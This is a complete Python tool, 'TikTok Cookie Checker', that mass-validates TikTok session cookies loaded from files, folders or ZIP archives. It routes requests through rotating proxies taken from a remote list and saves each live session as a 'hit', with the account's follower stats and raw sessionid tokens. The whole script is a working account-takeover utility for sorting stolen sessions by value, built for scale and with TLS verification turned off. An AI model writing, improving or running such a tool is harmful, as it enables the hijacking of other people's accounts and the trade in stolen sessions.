import requests
import json
import re
import time
import sys
import os
import zipfile
import threading
import queue
from datetime import datetime
import urllib.parse

# Simple colors for terminal
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Global variables
lock = threading.Lock()
save_lock = threading.Lock()

hits = 0
bad = 0
unknown = 0
errs = 0
total = 0
checked = 0
start_time = None
running = True

hit_buf = []
bad_buf = []
unk_buf = []
SAVE_N = 10
seen = set()

proxies = []
px_idx = 0
px_lock = threading.Lock()
use_px = False
dead_px = set()

rd = {}
PROXY_URL = "https://proxy-j4e9.onrender.com/live.txt"

# Simple banner
BANNER = f"""
{BOLD}{RED}╔════════════════════════════════════════╗
║     TIKTOK COOKIE CHECKER v2.0        ║
║     Fixed Stats | Fast & Reliable     ║
╚════════════════════════════════════════╝{RESET}
"""

def load_proxies():
    """Load proxies from URL"""
    global proxies
    print(f"{YELLOW}[~] Fetching proxies...{RESET}")
    try:
        r = requests.get(PROXY_URL, timeout=15)
        if r.status_code != 200:
            print(f"{RED}[x] Proxy fetch failed{RESET}")
            return False
        px = []
        for line in r.text.strip().split('\n'):
            line = line.strip()
            if not line:
                continue
            p = line.split(':')
            if len(p) == 4:
                px.append(f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}")
            elif len(p) == 2:
                px.append(f"http://{p[0]}:{p[1]}")
        proxies = px
        print(f"{GREEN}[+] Loaded {len(proxies)} proxies{RESET}")
        return len(proxies) > 0
    except Exception as e:
        print(f"{RED}[x] Proxy error: {e}{RESET}")
        return False

def next_px():
    """Get next proxy"""
    global px_idx
    if not proxies:
        return None
    
    with px_lock:
        attempts = 0
        max_attempts = len(proxies) * 2
        
        while attempts < max_attempts:
            p = proxies[px_idx % len(proxies)]
            px_idx += 1
            attempts += 1
            
            if p not in dead_px:
                return {"http": p, "https": p}
        
        if dead_px:
            dead_px.clear()
        
        p = proxies[px_idx % len(proxies)]
        px_idx += 1
        return {"http": p, "https": p}

def do_get(url, cookies=None, headers=None, timeout=10):
    """Make HTTP request with proxy support"""
    max_retries = 2
    
    for attempt in range(max_retries):
        if not running:
            return None
        
        px = next_px() if use_px else None
        
        try:
            r = requests.get(
                url,
                cookies=cookies,
                headers=headers,
                proxies=px,
                timeout=(5, timeout),
                allow_redirects=True,
                verify=False
            )
            return r
            
        except requests.exceptions.ProxyError:
            if px:
                with px_lock:
                    dead_px.add(px.get('http', ''))
        except:
            time.sleep(0.5)
    
    return None

def parse_cookies(text):
    """Parse cookies from various formats"""
    text = text.strip()
    if not text:
        return {}

    # Try JSON first
    try:
        if '{' in text and '}' in text:
            start = text.find('{')
            end = text.rfind('}') + 1
            data = json.loads(text[start:end])
            if isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass

    # Try Netscape format
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            if name:
                cookies[name] = value
                continue
        
        # Try key=value format
        if '=' in line and not line.startswith('http'):
            parts = line.split('=', 1)
            if len(parts) == 2:
                name = parts[0].strip().strip('"')
                value = parts[1].strip().strip(';').strip('"')
                if name and len(name) > 1 and not name.startswith('.'):
                    cookies[name] = value
    
    return cookies

def check_account(cookies):
    """Check if TikTok account is valid"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.tiktok.com/',
        'Origin': 'https://www.tiktok.com',
    }
    
    r = do_get('https://www.tiktok.com/passport/web/account/info/',
               cookies=cookies, headers=headers, timeout=10)

    if r is None or r.status_code != 200:
        return None, 'error'

    try:
        data = r.json()
    except:
        return None, 'error'

    # Check for errors
    error_code = data.get('error_code') or data.get('code') or 0
    if error_code in [8, 13, 10, 2483, 2484]:
        return None, 'expired'
    
    message = str(data.get('message', '')).lower()
    description = str(data.get('description', '')).lower()
    combo = message + ' ' + description
    
    if any(word in combo for word in ['expired', 'login', 'unauthorized', 'invalid', 'need login', 'not logged']):
        return None, 'expired'
    
    # Get account data
    acc_data = data.get('data', {})
    if not acc_data:
        # Try alternate response structure
        if data.get('user_id') or data.get('username'):
            acc_data = data
    
    if not acc_data or not acc_data.get('username'):
        return None, 'expired'
    
    return acc_data, 'valid'

def get_stats(username, cookies):
    """Get account stats with multiple fallback methods"""
    if not username:
        return {}
    
    stats = {
        'followers': 0,
        'following': 0,
        'likes': 0,
        'videos': 0,
        'nickname': ''
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.tiktok.com/',
    }
    
    # Method 1: Try API endpoint with secUid
    r = do_get(f'https://www.tiktok.com/api/user/detail/?uniqueId={username}',
               cookies=cookies, headers=headers, timeout=8)
    
    if r and r.status_code == 200:
        try:
            data = r.json()
            user_info = data.get('userInfo', {})
            user = user_info.get('user', {})
            user_stats = user_info.get('stats', {})
            
            if user.get('uniqueId', '').lower() == username.lower():
                stats = {
                    'nickname': user.get('nickname', ''),
                    'followers': user_stats.get('followerCount', 0),
                    'following': user_stats.get('followingCount', 0),
                    'likes': user_stats.get('heartCount', 0),
                    'videos': user_stats.get('videoCount', 0),
                    'digg': user_stats.get('diggCount', 0),
                }
                return stats
        except:
            pass
    
    # Method 2: Try HTML parsing with better regex
    headers2 = headers.copy()
    headers2['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    
    r = do_get(f'https://www.tiktok.com/@{username}', 
               cookies=cookies, headers=headers2, timeout=8)
    
    if r and r.status_code == 200:
        html = r.text
        
        # Try to find JSON data in script tags
        json_pattern = r'<script[^>]*id="__UNIVERSAL_DATA_FOR_REHYDRATION__"[^>]*>([^<]+)</script>'
        match = re.search(json_pattern, html)
        
        if match:
            try:
                data = json.loads(match.group(1))
                # Navigate to user data
                user_data = data.get('__DEFAULT_SCOPE__', {}).get('webapp.user-detail', {}).get('userInfo', {})
                if user_data:
                    user = user_data.get('user', {})
                    user_stats = user_data.get('stats', {})
                    stats = {
                        'nickname': user.get('nickname', ''),
                        'followers': user_stats.get('followerCount', 0),
                        'following': user_stats.get('followingCount', 0),
                        'likes': user_stats.get('heartCount', 0),
                        'videos': user_stats.get('videoCount', 0),
                    }
                    return stats
            except:
                pass
        
        # Method 3: Regex fallback
        patterns = {
            'followers': r'"followerCount"\s*:\s*(\d+)',
            'following': r'"followingCount"\s*:\s*(\d+)',
            'likes': r'"heartCount"\s*:\s*(\d+)',
            'videos': r'"videoCount"\s*:\s*(\d+)',
            'nickname': r'"nickname"\s*:\s*"([^"]+)"'
        }
        
        for key, pattern in patterns.items():
            match = re.search(pattern, html)
            if match:
                if key == 'nickname':
                    stats[key] = match.group(1)
                else:
                    stats[key] = int(match.group(1))
    
    return stats

def format_number(n):
    """Format large numbers"""
    try:
        n = int(n)
        if n >= 1000000:
            return f"{n/1000000:.1f}M"
        elif n >= 1000:
            return f"{n/1000:.1f}K"
        return str(n)
    except:
        return str(n)

def save_hit(user, stats, cookies, source):
    """Save hit to file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Create Netscape format cookies
    netscape = "# Netscape HTTP Cookie File\n"
    netscape += f"# TikTok Cookies - @{user}\n"
    netscape += f"# Saved: {timestamp}\n"
    
    for name, value in cookies.items():
        if name in ['sessionid', 'sid_tt', 'uid_tt', 'odin_tt', 'ttwid']:
            netscape += f".tiktok.com\tTRUE\t/\tFALSE\t0\t{name}\t{value}\n"
    
    content = f"""============================================================
TIKTOK COOKIE HIT - @{user}
============================================================
Time: {timestamp}
Source: {source}
Username: @{user}
Nickname: {stats.get('nickname', 'N/A')}
Followers: {format_number(stats.get('followers', 0))}
Following: {format_number(stats.get('following', 0))}
Likes: {format_number(stats.get('likes', 0))}
Videos: {format_number(stats.get('videos', 0))}
Profile: https://www.tiktok.com/@{user}

============================================================
COOKIES (Netscape Format)
============================================================
{netscape}

============================================================
RAW COOKIES
============================================================
{json.dumps(cookies, indent=2, ensure_ascii=False)}
============================================================
"""
    
    filename = f"hit_{user}_{stats.get('followers', 0)}_{int(time.time())}.txt"
    filepath = os.path.join(rd['hits'], filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(content)

def process_cookie(filename, cookie_text):
    """Process a single cookie file"""
    global hits, bad, unknown, errs, checked
    
    # Parse cookies
    cookies = parse_cookies(cookie_text)
    if not cookies:
        with lock:
            bad += 1
            checked += 1
        return
    
    # Check for required cookies
    if not any(c in cookies for c in ['sessionid', 'sid_tt']):
        with lock:
            bad += 1
            checked += 1
        return
    
    # Check duplicate
    uid = f"{cookies.get('sessionid', '')}|{cookies.get('sid_tt', '')}"
    with save_lock:
        if uid in seen:
            with lock:
                checked += 1
            return
        seen.add(uid)
    
    # Validate account
    acc_data, status = check_account(cookies)
    
    if status == 'expired':
        with lock:
            bad += 1
            checked += 1
        return
    
    if status == 'error' or not acc_data:
        with lock:
            unknown += 1
            checked += 1
        return
    
    username = acc_data.get('username')
    if not username:
        with lock:
            bad += 1
            checked += 1
        return
    
    # It's a hit!
    stats = get_stats(username, cookies)
    
    with lock:
        hits += 1
        checked += 1
    
    # Save hit
    save_hit(username, stats, cookies, filename)
    
    # Display hit with followers count
    followers = format_number(stats.get('followers', 0))
    print(f"\n{GREEN}[HIT #{hits}] @{username} | {followers} followers | {filename}{RESET}")

def worker(queue_obj):
    """Worker thread function"""
    while running:
        try:
            filename, cookie_text = queue_obj.get(timeout=1)
        except queue.Empty:
            return
        except:
            return
        
        try:
            process_cookie(filename, cookie_text)
        except Exception as e:
            with lock:
                errs += 1
                checked += 1
        finally:
            queue_obj.task_done()

def load_files(path):
    """Load cookie files from path"""
    files = []
    
    if not os.path.exists(path):
        print(f"{RED}[x] Path not found{RESET}")
        return files
    
    if path.lower().endswith('.zip'):
        print(f"{YELLOW}[~] Loading ZIP file...{RESET}")
        try:
            with zipfile.ZipFile(path, 'r') as zf:
                for name in zf.namelist():
                    if name.lower().endswith('.txt') and '__MACOSX' not in name:
                        try:
                            content = zf.read(name).decode('utf-8', errors='ignore')
                            if content.strip():
                                files.append((name, content))
                        except:
                            pass
        except Exception as e:
            print(f"{RED}[x] ZIP error: {e}{RESET}")
    
    elif os.path.isdir(path):
        print(f"{YELLOW}[~] Loading directory...{RESET}")
        for root, _, filenames in os.walk(path):
            for filename in filenames:
                if filename.endswith('.txt'):
                    filepath = os.path.join(root, filename)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        if content.strip():
                            rel_path = os.path.relpath(filepath, path)
                            files.append((rel_path, content))
                    except:
                        pass
    
    elif os.path.isfile(path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            if content.strip():
                files.append((os.path.basename(path), content))
        except:
            pass
    
    print(f"{GREEN}[+] Loaded {len(files)} cookie files{RESET}")
    return files

def display_status():
    """Display current status"""
    if start_time is None:
        return
    
    elapsed = time.time() - start_time
    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
    percent = (checked / total * 100) if total > 0 else 0
    
    status = (f"\r{WHITE}[{GREEN}Hits:{hits}{WHITE}|"
              f"{RED}Bad:{bad}{WHITE}|"
              f"{YELLOW}Unk:{unknown}{WHITE}|"
              f"{BLUE}{checked}/{total}({percent:.1f}%){WHITE}|"
              f"{CYAN}{cpm}cpm{WHITE}|"
              f"{elapsed:.0f}s{WHITE}]  {RESET}")
    
    sys.stdout.write(status)
    sys.stdout.flush()

def mass_checker():
    """Main mass checker function"""
    global hits, bad, unknown, errs, total, checked, start_time, running, rd, use_px
    
    print(f"\n{BLUE}{BOLD}MASS CHECKER MODE{RESET}\n")
    
    # Get path
    path = input(f"{WHITE}[?] Path (file/folder/zip): {RESET}").strip().strip('"\'')
    if not path:
        print(f"{RED}[x] No path provided{RESET}")
        return
    
    # Load files
    files = load_files(path)
    if not files:
        print(f"{RED}[x] No cookie files found{RESET}")
        return
    
    total = len(files)
    
    # Ask about proxies
    proxy_choice = input(f"{WHITE}[?] Use proxies? (y/n) [n]: {RESET}").strip().lower()
    if proxy_choice in ('y', 'yes'):
        if load_proxies():
            use_px = True
        else:
            print(f"{YELLOW}[!] Continuing without proxies{RESET}")
    
    # Get thread count
    while True:
        try:
            thread_input = input(f"{WHITE}[?] Threads (1-20) [10]: {RESET}").strip()
            threads = int(thread_input) if thread_input else 10
            if 1 <= threads <= 20:
                break
            print(f"{RED}[x] Enter 1-20{RESET}")
        except:
            print(f"{RED}[x] Invalid input{RESET}")
    
    # Create results directory
    results_dir = "tiktok_results"
    os.makedirs(results_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    run_dir = os.path.join(results_dir, f"check_{timestamp}")
    os.makedirs(run_dir, exist_ok=True)
    
    rd = {
        'hits': os.path.join(run_dir, 'hits'),
        'bad': os.path.join(run_dir, 'bad'),
        'unknown': os.path.join(run_dir, 'unknown')
    }
    
    for dir_path in rd.values():
        os.makedirs(dir_path, exist_ok=True)
    
    print(f"\n{GREEN}[+] Results will be saved to: {run_dir}{RESET}\n")
    time.sleep(1)
    
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display header
    print(f"{BANNER}")
    print(f"{WHITE}Files: {total} | Threads: {threads} | Proxies: {len(proxies) if use_px else 0}{RESET}\n")
    
    # Reset stats
    hits = bad = unknown = errs = checked = 0
    running = True
    
    # Create queue
    file_queue = queue.Queue()
    for item in files:
        file_queue.put(item)
    
    # Start time
    start_time = time.time()
    
    # Start workers
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(file_queue,), daemon=True)
        t.start()
        workers.append(t)
    
    try:
        # Wait for completion
        while not file_queue.empty() or any(t.is_alive() for t in workers):
            display_status()
            time.sleep(0.5)
            
            if file_queue.empty():
                time.sleep(2)
                break
                
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}[!] Stopping...{RESET}")
        running = False
        time.sleep(2)
    
    # Final status
    elapsed = time.time() - start_time
    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
    hit_rate = (hits / checked * 100) if checked > 0 else 0
    
    print(f"\n\n{CYAN}{'='*50}{RESET}")
    print(f"{GREEN}{BOLD}COMPLETED!{RESET}")
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"{GREEN}Hits:      {hits}{RESET}")
    print(f"{RED}Bad:       {bad}{RESET}")
    print(f"{YELLOW}Unknown:   {unknown}{RESET}")
    print(f"{WHITE}Errors:    {errs}{RESET}")
    print(f"{BLUE}Checked:   {checked}/{total}{RESET}")
    print(f"{CYAN}Hit Rate:  {hit_rate:.2f}%{RESET}")
    print(f"{WHITE}Time:      {elapsed:.0f}s ({cpm} CPM){RESET}")
    
    # Count results
    hit_count = len(os.listdir(rd['hits'])) if os.path.exists(rd['hits']) else 0
    print(f"\n{GREEN}Saved {hit_count} hits to: {run_dir}{RESET}")
    print(f"{CYAN}{'='*50}{RESET}\n")

def single_check():
    """Single cookie check mode"""
    print(f"\n{BLUE}{BOLD}SINGLE CHECK MODE{RESET}")
    print(f"{YELLOW}[~] Paste cookies (press Enter twice when done):{RESET}\n")
    
    lines = []
    empty_count = 0
    
    while True:
        try:
            line = input()
        except EOFError:
            break
        
        if not line.strip():
            empty_count += 1
            if empty_count >= 2:
                break
            lines.append(line)
        else:
            empty_count = 0
            lines.append(line)
    
    cookie_text = '\n'.join(lines)
    if not cookie_text.strip():
        print(f"{RED}[x] No input provided{RESET}")
        return
    
    # Parse cookies
    cookies = parse_cookies(cookie_text)
    if not cookies:
        print(f"{RED}[x] Failed to parse cookies{RESET}")
        return
    
    print(f"{GREEN}[+] Parsed {len(cookies)} cookies{RESET}")
    
    # Ask about proxies
    proxy_choice = input(f"{WHITE}[?] Use proxies? (y/n) [n]: {RESET}").strip().lower()
    if proxy_choice in ('y', 'yes'):
        if load_proxies():
            global use_px
            use_px = True
    
    print(f"{YELLOW}[~] Checking account...{RESET}")
    
    # Check account
    acc_data, status = check_account(cookies)
    
    if status == 'expired':
        print(f"{RED}[x] Cookies are expired or invalid{RESET}")
        return
    elif status == 'error' or not acc_data:
        print(f"{YELLOW}[?] Failed to check account (network error){RESET}")
        return
    
    username = acc_data.get('username')
    if not username:
        print(f"{RED}[x] No username found in account data{RESET}")
        return
    
    print(f"{GREEN}[+] Valid account: @{username}{RESET}")
    
    # Get stats
    print(f"{YELLOW}[~] Fetching stats...{RESET}")
    stats = get_stats(username, cookies)
    
    # Display info
    print(f"\n{CYAN}{'='*50}{RESET}")
    print(f"{GREEN}{BOLD}ACCOUNT INFO{RESET}")
    print(f"{CYAN}{'='*50}{RESET}")
    print(f"{WHITE}Username:  @{username}{RESET}")
    print(f"{WHITE}Nickname:  {stats.get('nickname', 'N/A')}{RESET}")
    print(f"{WHITE}Followers: {format_number(stats.get('followers', 0))}{RESET}")
    print(f"{WHITE}Following: {format_number(stats.get('following', 0))}{RESET}")
    print(f"{WHITE}Likes:     {format_number(stats.get('likes', 0))}{RESET}")
    print(f"{WHITE}Videos:    {format_number(stats.get('videos', 0))}{RESET}")
    print(f"{WHITE}Profile:   https://www.tiktok.com/@{username}{RESET}")
    print(f"{CYAN}{'='*50}{RESET}\n")

def main():
    """Main function"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    print(f"{GREEN}[1] Single Check{RESET}")
    print(f"{BLUE}[2] Mass Checker{RESET}")
    print(f"{RED}[0] Exit{RESET}\n")
    
    while True:
        choice = input(f"{WHITE}[?] Choose: {RESET}").strip()
        
        if choice == '1':
            single_check()
            break
        elif choice == '2':
            mass_checker()
            break
        elif choice == '0':
            print(f"\n{GREEN}Goodbye!{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}[x] Invalid choice{RESET}")

if __name__ == '__main__':
    # Disable warnings
    try:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass
    
    main()
